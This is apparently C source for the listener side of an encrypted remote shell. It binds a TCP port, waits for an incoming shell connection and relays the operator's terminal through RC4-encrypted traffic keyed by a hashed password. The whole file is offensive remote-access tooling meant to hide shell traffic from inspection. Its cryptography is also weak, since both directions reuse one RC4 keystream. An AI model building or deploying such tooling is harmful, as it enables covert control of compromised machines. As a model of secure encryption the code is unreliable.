#include <stdlib.h>
#include <netinet/in.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <memory.h>
#include "sha256.h"
// Usage: ./server [PORT] [ENCRYPTION KEY]

ssize_t read(int fd, void *buf, size_t count);
ssize_t write(int fd, const void *buf, size_t count);

typedef struct PASSING_PARAMS
{
    unsigned char *password;
    unsigned int len;
    unsigned int in;
    unsigned int out;
} PassingParams;

void swap(unsigned int *a, unsigned int *b)
{
    unsigned int tmp = *a;
    *a = *b;
    *b = tmp;
}

void *encrypt(void *ptr)
{
    PassingParams *paramPtr = (PassingParams *)ptr;

    unsigned int S[256];
    unsigned int j = 0;
    unsigned int i = 0;
    unsigned int k = 0;
    unsigned int drop = 0;
    unsigned int rnd = 0;
    for (i = 0; i < 256; i++)
    {
        S[i] = i;
    }
    for (i = 0; i < 256; i++)
    {
        j = (j + S[i] + paramPtr->password[i % paramPtr->len]) % 256;
        swap(&S[i], &S[j]);
    }
    i = 0;
    j = 0;

    for (drop = 0; drop < 1024; ++drop)
    {
        unsigned char bufA[1];
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        swap(&S[i], &S[j]);
        rnd = S[(S[i] + S[j]) % 256];
    }

    while (1)
    {
        unsigned char bufA[1];
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        swap(&S[i], &S[j]);
        rnd = S[(S[i] + S[j]) % 256];
        read(paramPtr->in, bufA, sizeof(bufA));
        bufA[0] = rnd ^ bufA[0];
        write(paramPtr->out, bufA, sizeof(bufA));
    }
}

int main(int argc, char *argv[])
{
    if (argc < 3)
    {
        printf("Usage: ./server [PORT] [ENCRYPTION KEY]\n");
        exit(1);
    }

    BYTE hash[SHA256_BLOCK_SIZE];
    SHA256_CTX ctx;

    sha256_init(&ctx);
    sha256_update(&ctx, argv[2], strlen(argv[2]));
    sha256_final(&ctx, hash);

    int sock, socket_fd, client_len;
    struct sockaddr_in server, client;

    int TCP_PORT = atoi(argv[1]);

    signal(SIGCHLD, SIG_IGN);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        exit(1);
    }
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = htons(TCP_PORT);

    if (bind(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        close(sock);
        exit(2);
    }
    listen(sock, 0);
    fprintf(stderr, "%s", "Listening\n");
    client_len = sizeof(client);
    socket_fd = accept(sock, (struct sockaddr *)&client, &client_len);
    if (socket_fd < 0)
    {
        close(sock);
        close(socket_fd);
        exit(3);
    }
    fprintf(stderr, "%s", "Shell Connected!\n");
    close(sock);

    pthread_t reader;
    PassingParams *socket_to_shell;
    socket_to_shell = (PassingParams *)malloc(sizeof(PassingParams));
    socket_to_shell->password = hash;
    socket_to_shell->len = SHA256_BLOCK_SIZE;
    socket_to_shell->in = socket_fd;
    socket_to_shell->out = 0;
    pthread_create(&reader, NULL, &encrypt, (void *)socket_to_shell);

    pthread_t writer;
    PassingParams *shell_to_socket;
    shell_to_socket = (PassingParams *)malloc(sizeof(PassingParams));
    shell_to_socket->password = hash;
    shell_to_socket->len = SHA256_BLOCK_SIZE;
    shell_to_socket->in = 1;
    shell_to_socket->out = socket_fd;
    pthread_create(&writer, NULL, &encrypt, (void *)shell_to_socket);

    while (1)
    {
        sleep(60);
        // shell is running
    }

    close(socket_fd);
    exit(0);
    return 0;
}